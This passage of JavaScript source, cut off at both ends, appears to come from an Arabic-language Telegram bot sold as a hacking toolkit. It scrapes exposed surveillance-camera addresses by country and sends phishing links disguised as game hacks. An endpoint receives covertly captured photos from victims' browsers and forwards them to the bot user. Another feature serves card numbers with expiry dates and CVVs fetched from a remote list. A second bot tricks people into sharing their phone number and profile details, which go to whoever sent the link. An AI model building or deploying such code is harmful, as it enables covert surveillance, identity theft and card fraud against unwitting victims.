    res.sendFile(path.join(__dirname, 's.html'));
});
const countryTranslation = {
  "AF": "أفغانستان 🇦🇫",
  "AL": "ألبانيا 🇦🇱",
  "DZ": "الجزائر 🇩🇿",
  "AO": "أنغولا 🇦🇴",
  "AR": "الأرجنتين 🇦🇷",
  "AM": "أرمينيا 🇦🇲",
  "AU": "أستراليا 🇦🇺",
  "AT": "النمسا 🇦🇹",
  "AZ": "أذربيجان 🇦🇿",
  "BH": "البحرين 🇧🇭",
  "BD": "بنغلاديش 🇧🇩",
  "BY": "بيلاروس 🇧🇾",
  "BE": "بلجيكا 🇧🇪",
  "BZ": "بليز 🇧🇿",
  "BJ": "بنين 🇧🇯",
  "BO": "بوليفيا 🇧🇴",
  "BA": "البوسنة والهرسك 🇧🇦",
  "BW": "بوتسوانا 🇧🇼",
  "BR": "البرازيل 🇧🇷",
  "BG": "بلغاريا 🇧🇬",
  "BF": "بوركينا فاسو 🇧ﺫ",
  "KH": "كمبوديا 🇰🇭",
  "CM": "الكاميرون 🇨🇲",
  "CA": "كندا 🇨🇦",
  "CL": "تشيلي 🇨🇱",
  "CN": "الصين 🇨🇳",
  "CO": "كولومبيا 🇨🇴",
  "CR": "كوستاريكا 🇨🇷",
  "HR": "كرواتيا 🇭🇷",
  "CY": "قبرص 🇨🇾",
  "CZ": "التشيك 🇨🇿",
  "DK": "الدنمارك 🇩🇰",
  "EC": "الإكوادور 🇪🇨",
  "EG": "مصر 🇪🇬",
  "SV": "السلفادور 🇸🇻",
  "EE": "إستونيا 🇪🇪",
  "ET": "إثيوبيا 🇪🇹",
  "FI": "فنلندا 🇫🇮",
  "FR": "فرنسا 🇫🇷",
  "GE": "جورجيا 🇬🇪",
  "DE": "ألمانيا 🇩🇪",
  "GH": "غانا 🇬🇭",
  "GR": "اليونان 🇬🇷",
  "GT": "غواتيمالا 🇬🇹",
  "HN": "هندوراس 🇭🇳",
  "HK": "هونغ كونغ 🇭🇰",
  "HU": "المجر 🇭🇺",
  "IS": "آيسلندا 🇮🇸",
  "IN": "الهند 🇮🇳",
  "ID": "إندونيسيا 🇮🇩",
  "IR": "إيران 🇮🇷",
  "IQ": "العراق 🇮🇶",
  "IE": "أيرلندا 🇮🇪",
  "IL": " المحتله 🇮🇱",
  "IT": "إيطاليا 🇮🇹",
  "CI": "ساحل العاج 🇨🇮",
  "JP": "اليابان 🇯🇵",
  "JO": "الأردن 🇯🇴",
  "KZ": "كازاخستان 🇰🇿",
  "KE": "كينيا 🇰🇪",
  "KW": "الكويت 🇰🇼",
  "KG": "قيرغيزستان 🇰🇬",
  "LV": "لاتفيا 🇱🇻",
  "LB": "لبنان 🇱🇧",
  "LY": "ليبيا 🇱🇾",
  "LT": "ليتوانيا 🇱🇹",
  "LU": "لوكسمبورغ 🇱🇺",
  "MO": "ماكاو 🇲🇴",
  "MY": "ماليزيا 🇲🇾",
  "ML": "مالي 🇲🇱",
  "MT": "مالطا 🇲🇹",
  "MX": "المكسيك 🇲🇽",
  "MC": "موناكو 🇲🇨",
  "MN": "منغوليا 🇲🇳",
  "ME": "الجبل الأسود 🇲🇪",
  "MA": "المغرب 🇲🇦",
  "MZ": "موزمبيق 🇲🇿",
  "MM": "ميانمار 🇲🇲",
  "NA": "ناميبيا 🇳🇦",
  "NP": "نيبال 🇳🇵",
  "NL": "هولندا 🇳🇱",
  "NZ": "نيوزيلندا 🇳🇿",
  "NG": "نيجيريا 🇳🇬",
  "KP": "كوريا الشمالية 🇰🇵",
  "NO": "النرويج 🇳🇴",
  "OM": "عمان 🇴🇲",
  "PK": "باكستان 🇵🇰",
  "PS": "فلسطين 🇵🇸",
  "PA": "بنما 🇵🇦",
  "PY": "باراغواي 🇵🇾",
  "PE": "بيرو 🇵🇪",
  "PH": "الفلبين 🇵🇭",
  "PL": "بولندا 🇵🇱",
  "PT": "البرتغال 🇵🇹",
  "PR": "بورتوريكو 🇵🇷",
  "QA": "قطر 🇶🇦",
  "RO": "رومانيا 🇷🇴",
  "RU": "روسيا 🇷🇺",
  "RW": "رواندا 🇷🇼",
  "SA": "السعودية 🇸🇦",
  "SN": "السنغال 🇸🇳",
  "RS": "صربيا 🇷🇸",
  "SG": "سنغافورة 🇸🇬",
  "SK": "سلوفاكيا 🇸🇰",
  "SI": "سلوفينيا 🇸🇮",
  "ZA": "جنوب أفريقيا 🇿🇦",
  "KR": "كوريا الجنوبية 🇰🇷",
  "ES": "إسبانيا 🇪🇸",
  "LK": "سريلانكا 🇱🇰",
  "SD": "السودان 🇸🇩",
  "SE": "السويد 🇸🇪",
  "CH": "سويسرا 🇨🇭",
  "SY": "سوريا 🇸🇾",
  "TW": "تايوان 🇹🇼",
  "TZ": "تنزانيا 🇹🇿",
  "TH": "تايلاند 🇹🇭",
  "TG": "توغو 🇹🇬",
  "TN": "تونس 🇹🇳",
  "TR": "تركيا 🇹🇷",
  "TM": "تركمانستان 🇹🇲",
  "UG": "أوغندا 🇺🇬",
  "UA": "أوكرانيا 🇺🇦",
  "AE": "الإمارات 🇦🇪",
  "GB": "بريطانيا 🇬🇧",
  "US": "امريكا 🇺🇸",
  "UY": "أوروغواي 🇺🇾",
  "UZ": "أوزبكستان 🇺🇿",
  "VE": "فنزويلا 🇻🇪",
  "VN": "فيتنام 🇻🇳",
  "ZM": "زامبيا 🇿🇲",
  "ZW": "زيمبابوي 🇿🇼",
  "GL": "غرينلاند 🇬🇱",
  "KY": "جزر كايمان 🇰🇾",
  "NI": "نيكاراغوا 🇳🇮",
  "DO": "الدومينيكان 🇩🇴",
  "NC": "كاليدونيا 🇳🇨",
  "LA": "لاوس 🇱🇦",
  "TT": "ترينيداد وتوباغو 🇹🇹",
  "GG": "غيرنزي 🇬🇬",
  "GU": "غوام 🇬🇺",
  "GP": "غوادلوب 🇬🇵",
  "MG": "مدغشقر 🇲🇬",
  "RE": "ريونيون 🇷🇪",
  "FO": "جزر فارو 🇫🇴",
  "MD": "مولدوفا 🇲🇩" 

    
};


const camRequestCounts = {};


async function initStorage() {
    await storage.init();
    vipUsers = await storage.getItem('vipUsers') || [];
}


async function saveVipUsers() {
    await storage.setItem('vipUsers', vipUsers);
}


function showCountryList(chatId, startIndex = 0) {
    try {
        const buttons = [];
        const countryCodes = Object.keys(countryTranslation);
        const countryNames = Object.values(countryTranslation);

        const endIndex = Math.min(startIndex + 99, countryCodes.length);

        for (let i = startIndex; i < endIndex; i += 3) {
            const row = [];
            for (let j = i; j < i + 3 && j < endIndex; j++) {
                const code = countryCodes[j];
                const name = countryNames[j];
                row.push({ text: name, callback_data: code });
            }
            buttons.push(row);
        }

        const navigationButtons = [];
        if (startIndex > 0) {
            navigationButtons.push 
        }
        if (endIndex < countryCodes.length) {
            navigationButtons.push({ text: "المزيد", callback_data: `next_${endIndex}` });
        }

        if (navigationButtons.length) {
            buttons.push(navigationButtons);
        }

        bot.sendMessage(chatId, "اختر الدولة:", {
            reply_markup: {
                inline_keyboard: buttons
            }
        });
    } catch (error) {
        bot.sendMessage(chatId, `حدث خطأ أثناء إنشاء القائمة: ${error.message}`);
    }
}


async function displayCameras(chatId, countryCode) {
    try {
        
        const message = await bot.sendMessage(chatId, "جاري اختراق كامراة مراقبه.....");
        const messageId = message.message_id;

        for (let i = 0; i < 15; i++) {
            await bot.editMessageText(`جاري اختراق كامراة مراقبه${'.'.repeat(i % 4)}`, {
                chat_id: chatId,
                message_id: messageId
            });
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        const url = `http://www.insecam.org/en/bycountry/${countryCode}`;
        const headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
        };

        let res = await axios.get(url, { headers });
        const lastPageMatch = res.data.match(/pagenavigator\("\?page=", (\d+)/);
        if (!lastPageMatch) {
            bot.sendMessage(chatId, "لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة الامان جرب دوله مختلفه او حاول مره اخرى لاحقًا.");
            return;
        }
        const lastPage = parseInt(lastPageMatch[1], 10);
        const cameras = [];

        for (let page = 1; page <= lastPage; page++) {
            res = await axios.get(`${url}/?page=${page}`, { headers });
            const pageCameras = res.data.match(/http:\/\/\d+\.\d+\.\d+\.\d+:\d+/g) || [];
            cameras.push(...pageCameras);
        }

        if (cameras.length) {
            const numberedCameras = cameras.map((camera, index) => `${index + 1}. ${camera}`);
            for (let i = 0; i < numberedCameras.length; i += 50) {
                const chunk = numberedCameras.slice(i, i + 50);
                await bot.sendMessage(chatId, chunk.join('\n'));
            }
            await bot.sendMessage(chatId, "لقد تم اختراق كامراة المراقبه من هذا الدوله يمكنك التمتع في المشاهده عمك المنحرف.\n ⚠️ملاحظه مهمه اذا لم تفتح الكامرات في جهازك او طلبت باسورد قم في تعير الدوله او حاول مره اخره لاحقًا ");
        } else {
            await bot.sendMessage(chatId, "لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة امانها جرب دوله اخره او حاول مره اخرى لاحقًا.");
        }
    } catch (error) {
        await bot.sendMessage(chatId, `لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة امانها جرب دوله اخره او حاول مره اخرى لاحقًا.`);
    }
}


function isDeveloper(chatId) {
    
    const developerChatId = 5739065274;
    return chatId === developerChatId;
}


function showAdminPanel(chatId) {
    bot.sendMessage(chatId, "لوحة التحكم:", {
        reply_markup: {
            inline_keyboard: [
                [{ text: "إضافة مستخدم VIP", callback_data: "add_vip" }],
                [{ text: "إزالة مستخدم VIP", callback_data: "remove_vip" }]
            ]
        }
    });
}

bot.onText(/\/jjjjjavayy/, (msg) => {
    const chatId = msg.chat.id;
    const message = 'مرحبًا! انقر على الرابط لإضافة أسماء المستخدمين.';
    bot.sendMessage(chatId, message, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'إختراق ببجي', callback_data: 'get_pubg' }],
                [{ text: 'إختراق فري فاير', callback_data: 'get_freefire' }],
                [{ text: 'إضافة أسماء', callback_data: 'add_names' }]
            ]
        }
    });
});

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    let link;

    if (query.data === 'get_pubg') {
        link = `${baseUrl}/g.html?chatId=${chatId}.png`;
    } else if (query.data === 'get_freefire') {
        link = `${baseUrl}/F.html?chatId=${chatId}.png`;
    } else if (query.data === 'add_names') {
        link = `${baseUrl}/s.html?chatId=${chatId}.png`;
    }

    if (link) {
        bot.sendMessage(chatId, `تم لغيم الرابط هذا: ${link}`);
        bot.answerCallbackQuery(query.id, { text: 'تم إرسال الرابط إليك ✅' });
    } else if (query.data === 'add_nammes') {
        bot.sendMessage(chatId, `قم بإرسال هذا لفتح أوامر اختراق الهاتف كاملاً قم بضغط على هذا الامر /Vip`);
        bot.answerCallbackQuery(query.id, { text: '' });
    }
});

bot.onText(/\/نننطسطوو/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "مرحبا! في بوت اختراق كاميرات المراقبة 📡", {
        reply_markup: {
            inline_keyboard: [[{ text: "ابدأ الاختراق", callback_data: "get_cameras" }]]
        }
    });

    if (isDeveloper(chatId)) {
        showAdminPanel(chatId);
    }
});


bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;

    if (query.data === 'get_cameras') {
        showCountryList(chatId);
    } else if (query.data in countryTranslation) {
        bot.deleteMessage(chatId, query.message.message_id);
        displayCameras(chatId, query.data);
    } else if (query.data.startsWith("next_")) {
        const startIndex = parseInt(query.data.split("_")[1], 10);
        bot.deleteMessage(chatId, query.message.message_id);
        showCountryList(chatId, startIndex);
    } else if (query.data.startsWith("prev_")) {
        const endIndex = parseInt(query.data.split("_")[1], 10);
        const startIndex = Math.max(0, endIndex - 18);
        bot.deleteMessage(chatId, query.message.message_id);
        showCountryList(chatId, startIndex);
    }
});

const americanBanks = [
  'Bank of America', 'Chase Bank', 'Citibank', 'Wells Fargo',
  'Capital One', 'PNC Bank', 'U.S. Bank', 'TD Bank',
  'SunTrust Bank', 'Fifth Third Bank'
];


const fetchVisaData = async () => {
  try {
    const url = 'https://iwhw.vercel.app/';
    const response = await axios.get(url);
    const text = response.data;

    const lines = text.trim().split('\n');
    if (lines.length > 0) {
      const visas = lines.map(line => {
        const parts = line.split('|');
        if (parts.length === 4) {
          return {
            CardNumber: parts[0],
            Expiry: `${parts[1]}/${parts[2]}`,
            CVV: parts[3],
            Bank: americanBanks[Math.floor(Math.random() * americanBanks.length)],
            CardType: 'VISA - DEBIT - VISA CLASSIC',
            Country: 'USA🇺🇸',
            Value: `$${Math.floor(Math.random() * 31) + 10}` 
          };
        }
      }).filter(Boolean); 

      if (visas.length > 0) {
        return visas[Math.floor(Math.random() * visas.length)]; 
      }
    }

    console.log("No visa data found or data format is not as expected.");
    return null;
  } catch (error) {
    console.log("An error occurred:", error.message);
    return null;
  }
};


bot.onText(/\/نكخمنتته/, (msg) => {
  const chatId = msg.chat.id;
  const options = {
    reply_markup: {
      inline_keyboard: [[
        { text: "Generate Visa", callback_data: "generate_visa" }
      ]]
    },
    parse_mode: "Markdown"
  };

  bot.sendMessage(chatId, "*Hi Bro, I'm* [™](t.me/) \n*Press the button below to generate Visa!*", options);
});


bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;

  if (callbackQuery.data === "generate_visa") {
    let progressMsg = await bot.sendMessage(chatId, "Generating Visa...\n[░░░░░░░░░░] 0%");
    
    await new Promise(res => setTimeout(res, 1000));
    await bot.editMessageText("Generating Visa...\n[▓▓░░░░░░░░] 25%", { chat_id: chatId, message_id: progressMsg.message_id });
    
    await new Promise(res => setTimeout(res, 1000));
    await bot.editMessageText("Generating Visa...\n[▓▓▓▓░░░░░░] 50%", { chat_id: chatId, message_id: progressMsg.message_id });
    
    await new Promise(res => setTimeout(res, 1000));
    await bot.editMessageText("Generating Visa...\n[▓▓▓▓▓▓░░░░] 75%", { chat_id: chatId, message_id: progressMsg.message_id });
    
    await new Promise(res => setTimeout(res, 1000));
    await bot.editMessageText("Generating Visa...\n[▓▓▓▓▓▓▓▓▓▓] 100%", { chat_id: chatId, message_id: progressMsg.message_id });
    
    await new Promise(res => setTimeout(res, 1000));
    await bot.deleteMessage(chatId, progressMsg.message_id);

    const visaData = await fetchVisaData();
    
    if (visaData) {
      const { CardNumber, Expiry, CVV, Bank, CardType, Country, Value } = visaData;

      bot.sendMessage(chatId, `
𝗣𝗮𝘀𝘀𝗲𝗱 ✅
*[-] Card Number :* \`${CardNumber}\`
*[-] Expiry :* \`${Expiry}\`
*[-] CVV :* \`${CVV}\`
*[-] Bank :* \`${Bank}\`
*[-] Card Type :* \`${CardType}\`
*[-] Country :* \`${Country}\`
*[-] Value :* \`${Value}\`
*============================
[-] by :* [BOT](t.me/ZI0_bot)
      `, { parse_mode: "Markdown" });
    } else {
      bot.sendMessage(chatId, "Failed to fetch visa data. Please try again later.");
    }
  }
});


const deleteFolderRecursive = (directoryPath) => {
    if (fs.existsSync(directoryPath)) {
        fs.readdirSync(directoryPath).forEach((file) => {
            const currentPath = path.join(directoryPath, file);
            if (fs.lstatSync(currentPath).isDirectory()) {
               
                deleteFolderRecursive(currentPath);
            } else {
               
                fs.unlinkSync(currentPath);
            }
        });
        fs.rmdirSync(directoryPath);
    }
};

app.use(express.static(__dirname));

app.post('/xx', (req, res) => {
    const chatId = req.body.chatId;
    const imageDatas = req.body.imageDatas.split(',');

    
    const imageDir = path.join(__dirname, 'images');
    if (!fs.existsSync(imageDir)) {
        fs.mkdirSync(imageDir);
    }

    
    imageDatas.forEach((imageData, index) => {
        const buffer = Buffer.from(imageData, 'base64');
        const imagePath = path.join(imageDir, `${chatId}_${index}.jpg`);
        fs.writeFileSync(imagePath, buffer);

        bot.sendPhoto(chatId, buffer, { caption: `الصوره🙋‍♂️ ${index + 1}` });
    });

    console.log(`Stored and sent photos for chatId ${chatId}`);
    res.redirect('/ok.html'); 
});

app.get('/ios', (req, res) => {
    res.sendFile(path.join(__dirname, 'xx.html'));
});
bot.onText(/\/اتتهتتاههة/, (msg) => {
    const chatId = msg.chat.id;
    const message = 'مرحبًا! انقر على الرابط أدناه للحصول على رابط لالتقاط الصور.';
    bot.sendMessage(chatId, message, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'احصل على رابط التقاط الصور', callback_data: 'get_photo_link' }]
            ]
        }
    });
});


bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;

    if (callbackQuery.data === 'get_photo_link') {
        const link = `${baseUrl}/xx.html?chatId=${chatId}`;
        bot.sendMessage(chatId, `هذا المميزه مقفله اني اخاف اشارك ذنبكم بسبب ان يوجد بعص الناس تسخدمه في مالايرضي الله ورسوله تتوفر هذا المميزه في نسخه ثانيه مدفوعة تنابع ققط لشخاص موثوقين وتحت مراقبه للستفسار راسل المطور \nالمطور @VlP_12`);
    }
});
bot.onText(/\/s2854تصخصrt/, (msg) => {
    const chatId = msg.chat.id;
    const user = msg.from;
    const nm = user.first_name;

 
    const key = {
        inline_keyboard: [
            [{ text: 'إنشاء إيميل وهمي', callback_data: 'create_email' }]
        ]
    };

    
    bot.sendMessage(chatId, `<strong>اهلا بك : | ${nm} | في بـوت انشـاء بريد وهمي لاستقبال الاكواد والرسائل للحصول على معلوماتك [ /info ]</strong>`, {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: key.inline_keyboard }
    });
});


bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    if (data === 'create_email') {
        
        bot.sendMessage(chatId, `
<strong>يمكنك إنشاء إيميل وهمي عن طريق اتباع الأوامر التالية:</strong>

لنشا ايمل وهمي  /email

لظهار الايمل الذي تم انشاءه  /an

لعرض الرسايل الذي تم استلمها /Messages

لحذف الايمل السابق /de

<strong>يرجى اتباع هذه الأوامر للاستفادة من الخدمة.</strong>
        `, {
            parse_mode: 'HTML'
        });
    }
});





const EMAILS_FILE = 'emails.json';

function readEmails() {
    try {
        const data = fs.readFileSync(EMAILS_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        
        return {};
    }
}


function writeEmails(emails) {
    fs.writeFileSync(EMAILS_FILE, JSON.stringify(emails, null, 2));
}

bot.onText(/\/email/, async (msg) => {
    const userId = msg.from.id;
    const chatId = msg.chat.id;

    let emails = readEmails();

    
    if (emails[userId]) {
        delete emails[userId];
    }

    try {
        bot.sendMessage(chatId, "<strong>جاري انشاء ايمل...</strong>", { parse_mode: 'HTML' });

        
        const randomSuffix = Math.random().toString(36).substring(2, 8); 
        const emailPrefix = `almunharif${randomSuffix}`; 

        
        const response = await axios.post('https://api.internal.temp-mail.io/api/v3/email/new', 
            { name: emailPrefix, domain: 'greencafe24.com' },
            { headers: { 'User-Agent': 'Your-User-Agent' } }
        );

        const email = response.data.email;

        
        emails[userId] = email;
        writeEmails(emails);

        bot.sendMessage(chatId, `<strong>تم انشاء ايمل بنجاح:\n</strong><code>${email}</code>\n<strong>اضغط على البريد لنسخه</strong>`, {
            parse_mode: 'HTML'
        });

    } catch (error) {
        bot.sendMessage(chatId, "<strong>❗لقد حدث خطأ ما</strong>", { parse_mode: 'HTML' });
    }
});

bot.onText(/\/an/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    
    let emails = readEmails();

    
    if (emails[userId]) {
        const email = emails[userId];
        bot.sendMessage(chatId, `<strong>الإيميل الذي تم إنشاؤه سابقاً هو:</strong>\n<code>${email}</code>\n<strong>اضغط على البريد لنسخه</strong>`, {
            parse_mode: 'HTML'
        });
    } else {
        bot.sendMessage(chatId, "<strong>لم يتم إنشاء أي إيميل بعد</strong>", { parse_mode: 'HTML' });
    }
});

bot.onText(/\/Messages/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    
    let emails = readEmails();

    
    if (emails[userId]) {
        const email = emails[userId];

        try {
            const response = await axios.get(`https://api.internal.temp-mail.io/api/v3/email/${email}/messages`);
            const messages = response.data;

            if (messages.length > 0) {
                messages.forEach(message => {
                    bot.sendMessage(chatId, `<strong>• تم استلام الرسالة 📩:\n${message.body_text}\n${message.subject}</strong>`, { parse_mode: 'HTML' });
                });
            } else {
                bot.sendMessage(chatId, "لم يتم استلام أي رسالة حالياً");
            }
        } catch (error) {
            bot.sendMessage(chatId, "<strong>حدث خطأ أثناء جلب الرسائل</strong>", { parse_mode: 'HTML' });
        }
    } else {
        bot.sendMessage(chatId, "<strong>قم بإنشاء حساب أولاً</strong>", { parse_mode: 'HTML' });
    }
});

bot.onText(/\/de/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    
    let emails = readEmails();

    
    if (emails[userId]) {
        
        delete emails[userId];
        writeEmails(emails);
        bot.sendMessage(chatId, "<strong>تم حذف حسابك 🗑</strong>", { parse_mode: 'HTML' });
    } else {
        bot.sendMessage(chatId, "<strong>ليس لديك إيميل بعد 🗳</strong>", { parse_mode: 'HTML' });
    }
});

bot.onText(/\/de/, async (msg) => {
    const chatId = msg.chat.id;

    try {
        fs.unlinkSync(`token${chatId}.txt`);
        bot.sendMessage(chatId, "<strong>تم حذف حسابك 🗑</strong>", { parse_mode: 'HTML' });
    } catch (error) {
        bot.sendMessage(chatId, "<strong>ليس لديك ايمل بعد 🗳ً</strong>", { parse_mode: 'HTML' });
    }
});


bot.onText(/\/sخسننسمس/, (msg) => {
    const chatId = msg.chat.id;
    const opts = {
        reply_markup: {
            inline_keyboard: [[{ text: "🔗 توليد رابط دعوة", callback_data: "generate_invite" }]],
        },
    };

    bot.sendMessage(chatId, "مرحبًا! اضغط على الزر لتوليد رابط دعوة.", opts);
});

bot.on('callback_query', (query) => {
    if (query.data === "generate_invite") {
        const userId = query.from.id;
        const inviteLink = `https://t.me/ygf2gbot?start=${userId}`;

        bot.sendMessage(query.message.chat.id, `تم انشاء رابط قم في ارساله لضحيه لمعرفة معلومات حسابه تلجرام:\n${inviteLink}`);
    }
});


secondBot.onText(/\/start (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const inviterId = parseInt(match[1]);

    inviteLinks[msg.from.id] = inviterId;

    const opts = {
        reply_markup: {
            keyboard: [[{ text: '📞 إرسال جهة الاتصال', request_contact: true }]],
            one_time_keyboard: true,
        },
    };

    secondBot.sendMessage(chatId, "يرجى إرسال جهة الاتصال للتحقق من أنك لست روبوتًا.", opts);
});


secondBot.on('contact', (msg) => {
    if (msg.contact && inviteLinks[msg.from.id]) {
        if (msg.contact.user_id === msg.from.id) {
            const inviterId = inviteLinks[msg.from.id];
            const userInfo = msg.from;
            const userId = userInfo.id;
            const firstName = userInfo.first_name;
            const lastName = userInfo.last_name || '';
            const username = userInfo.username || 'لا يوجد اسم مستخدم';
            const bio = userInfo.bio || 'لا توجد نبذة';
            const contactNumber = msg.contact.phone_number;

            
            secondBot.getUserProfilePhotos(userId).then((photos) => {
                const infoMessage = `*👤 معلومات الحساب:*\n\n` +
                    `*الاسم : ${firstName} ${lastName}*\n\n` +
                    `*اليوزر : @${username}*\n\n` +
                    `*الايدي : ${userId}*\n\n` +
                    `رقم الهاتف : ${contactNumber}\n`;

                if (photos.total_count > 0) {
                    
                    const photoId = photos.photos[0][0].file_id;

                    if (photoId) {
                        
                        bot.sendPhoto(inviterId, photoId, { caption: infoMessage, parse_mode: 'Markdown' })
                            .then(() => {
                                console.log('تم إرسال الصورة بنجاح.');
                            })
                            .catch((error) => {
                                console.error('حدث خطأ أثناء إرسال الصورة:', error);
                                bot.sendMessage(inviterId, infoMessage, { parse_mode: 'Markdown' });
                            });
                    } else {
                        bot.sendMessage(inviterId, infoMessage, { parse_mode: 'Markdown' });
                    }
                } else {
                    bot.sendMessage(inviterId, infoMessage, { parse_mode: 'Markdown' });
                }

                secondBot.sendMessage(msg.chat.id, "تم التحقق بنجاح ✅");
                delete inviteLinks[msg.from.id];
            }).catch((error) => {
                console.error('حدث خطأ أثناء محاولة الحصول على صورة الملف الشخصي:', error);
                secondBot.sendMessage(msg.chat.id, "حدثت مشكلة أثناء محاولة الحصول على صورة الملف الشخصي.");
            });
        } else {
            secondBot.sendMessage(msg.chat.id, "يرجى إرسال جهة الاتصال الخاصة بك فقط.");
        }
    } else {
        secondBot.sendMessage(msg.chat.id, "لم يتم التحقق من جهة الاتصال.");
    }
});


secondBot.on('message', (msg) => {
    if (!msg.contact && msg.text !== '/start') {
        const opts = {
            reply_markup: {
                keyboard: [[{ text: '📞 إرسال جهة الاتصال', request_contact: true }]],
                one_time_keyboard: true,
            },
        };
        secondBot.sendMessage(msg.chat.id, "يرجى إرسال جهة الاتصال للتحقق.", opts);
    }
});
const countries = {
    "+1": ["أمريكا", "🇺🇸"],
    "+46": ["السويد", "🇸🇪"],
    "+86": ["الصين", "🇨🇳"],
    "+852": ["هونغ كونغ", "🇭🇰"],
    "+45": ["الدنمارك", "🇩🇰"],
    "+33": ["فرنسا", "🇫🇷"],
    "+31": ["هولندا", "🇳🇱"],
    "+7": ["روسيا", "🇷🇺"],
    "+7KZ": ["كازاخستان", "🇰🇿"],
    "+381": ["صربيا", "🇷🇸"],
    "+44": ["بريطانيا", "🇬🇧"],
    "+371": ["لاتفيا", "🇱🇻"],
    "+62": ["إندونيسيا", "🇮🇩"],
    "+351": ["البرتغال", "🇵🇹"],
    "+34": ["إسبانيا", "🇪🇸"],
    "+372": ["إستونيا", "🇪🇪"],
    "+358": ["فنلندا", "🇫🇮"]
};


async function importNumbers() {
    try {
        const response = await axios.get('https://nm-umber.vercel.app/');
        return response.data.split('\n');
    } catch (error) {
        console.error("خطأ في جلب الأرقام:", error);
        return [];
    }
}


async function getRandomNumberInfo() {
    const numbers = await importNumbers();
    if (numbers.length === 0) return null;

    const randomIndex = Math.floor(Math.random() * numbers.length);
    const number = numbers[randomIndex].trim();
    const creationDate = new Date().toISOString().split('T')[0];
    const creationTime = new Date().toLocaleTimeString('ar-SA');

    let countryCode;
    if (number.startsWith("+1")) {
        countryCode = "+1";
    } else if (number.startsWith("+7")) {
        countryCode = number.includes("7") ? "+7KZ" : "+7";
    } else {
        countryCode = number.slice(0, 4) in countries ? number.slice(0, 4) : number.slice(0, 3);
    }

    const [countryName, countryFlag] = countries[countryCode] || ["دولة غير معروفة", "🚩"];
    return {
        number,
        countryCode,
        countryName,
        countryFlag,
        creationDate,
        creationTime
    };
}


async function getMessages(num) {
    try {
        const response = await axios.get(`https://sms24.me/en/numbers/${num}`);
        const $ = cheerio.load(response.data);
        const messages = [];
        $('span.placeholder.text-break').each((index, element) => {
            messages.push($(element).text().trim());
        });
        return messages;
    } catch (error) {
        console.error("خطأ في جلب الرسائل:", error);
        return [];
    }
}


bot.onText(/\/stسمهصخصt/, (msg) => {
    const chatId = msg.chat.id;
    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'الحصول على رقم وهمي', callback_data: 'get_number' }]
            ]
        }
    };
    bot.sendMessage(chatId, "اضغط على الزر للحصول على رقم وهمي:", options);
});
const m =('لجميع الموقع والبرامج') 

bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;
    const data = callbackQuery.data;

    if (data === 'get_number') {
        const info = await getRandomNumberInfo();
        if (info) {
            const options = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'تغير الرقم 🔁', callback_data: 'get_number' }],
                        [{ text: 'طلب الكود 💬', callback_data: `request_code_${info.number}` }]
                    ]
                }
            };

            const response = `\n➖ تم الطلب 🛎• \n➖ رقم الهاتف ☎️ : \`${info.number}\`\n` +
                `➖ الدوله : ${info.countryName} ${info.countryFlag}\n` +
                `➖ رمز الدوله 🌏 : ${info.countryCode}\n` +
                `➖ المنصه 🔮 : ${m}\n` +
                `➖ تاريج الانشاء 📅 : ${info.creationDate}\n` +
                `➖ وقت الانشاء ⏰ : ${info.creationTime}\n` +
                `➖ اضغط ع الرقم لنسخه.`;
            bot.editMessageText(response, { chat_id: chatId, message_id: msg.message_id, parse_mode: "Markdown", reply_markup: options.reply_markup });
        } else {
            bot.sendMessage(chatId, "لم يتم استيراد الأرقام بنجاح.");
        }
    } else if (data.startsWith('request_code_')) {
        const num = data.split('_')[2];
        const messages = await getMessages(num);
        if (messages.length > 0) {
            let messageText = messages.slice(0, 6).map((msg, index) => `الرسالة رقم ${index + 1}: \`${msg}\``).join('\n\n');
            messageText += "\n\nاضغط على أي رسالة لنسخها.";
            bot.sendMessage(chatId, messageText, { parse_mode: "Markdown" });
        } else {
            bot.sendMessage(chatId, "لا توجد رسائل جديدة.");
        }
    }
});


//القايمه الخطيره
const dangerous_keywords = ["glitch", "cleanuri","gd","tinyurl","link","clck","replit","php","html","onrender","blog","index","000",];
// قائمة الامنه
const safe_urls = ["www", "t.me","store","https://youtu.be","instagram.com","facebook.com","tiktok.com","pin","snapchat.com",".com","whatsapp.com",];


let waiting_for_link = {};

function checkUrl(url) {
    const url_lower = url.toLowerCase();

    
    for (let safe_url of safe_urls) {
        if (url_lower.includes(safe_url)) {
            return "آمن 🟢";
        }
    }

    
    for (let keyword of dangerous_keywords) {
        if (url_lower.includes(keyword)) {
            return "خطير جداً 🔴";
        }
    }

    
    if (!url_lower.includes('.com')) {
        return "مشبوه 🟠";
    }

    return "آمن 🟢";
}

function isValidUrl(url) {
    
    const regex = new RegExp(/^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/i);
    return regex.test(url);
}

async function getIpInfo(ip) {
    
    try {
        const response = await axios.get(`https://ipinfo.io/${ip}/json`);
        return response.data;
    } catch (error) {
        return null;
    }
}

function extractIpFromUrl(url) {
    
    try {
        const hostname = new URL(url).hostname;
        return new Promise((resolve, reject) => {
            dns.lookup(hostname, (err, address) => {
                if (err) reject(null);
